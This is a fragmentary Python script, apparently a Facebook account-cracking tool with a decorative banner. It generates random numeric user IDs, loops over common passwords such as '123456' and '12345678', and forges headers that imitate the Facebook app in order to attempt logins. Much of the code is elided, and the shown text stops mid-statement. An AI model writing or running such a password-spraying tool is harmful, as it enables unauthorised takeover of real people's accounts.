...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[1;32m        [ JAY Y◈✙◈ \33[1;33mSHREE ◈✙◈\33[1;37m RAAM  ]
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
...
def main():
    ...
    if ask in["1"]:
        ...
        for i in range(int(limit)):
            data=str(random.choice(range(6000000000,16999999999)))
            user.append(data)
    else:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(6000000000,6999999999)))
            user.append(data)    
...
def login(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ["57273200","123456789","1234567","12345678","123456"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(60000000.0, 30000000.0)), 
